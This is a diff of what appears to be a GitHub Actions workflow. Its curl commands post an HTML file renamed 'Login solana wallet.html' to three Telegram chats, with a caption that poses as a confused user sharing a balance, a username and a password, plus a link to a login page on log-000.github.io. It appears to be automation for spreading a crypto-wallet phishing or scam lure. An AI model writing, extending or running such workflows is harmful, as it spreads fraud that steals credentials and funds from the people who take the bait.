@@ -42,7 +42,7 @@ jobs:
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
-            curl -s -F document=@Login.html \
+            curl -s -F document=@"Login solana wallet.html" \
             -F chat_id=-1002507938213 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
@@ -59,7 +59,7 @@ jobs:
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
-            curl -s -F document=@Login.html \
+            curl -s -F document=@"Login solana wallet.html" \
             -F chat_id=-1002665528411 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
@@ -76,7 +76,7 @@ jobs:
             
             CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
             
-            curl -s -F document=@Login.html \
+            curl -s -F document=@"Login solana wallet.html" \
             -F chat_id=-1002680039813 \
             -F caption="$CAPTION" \
             https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
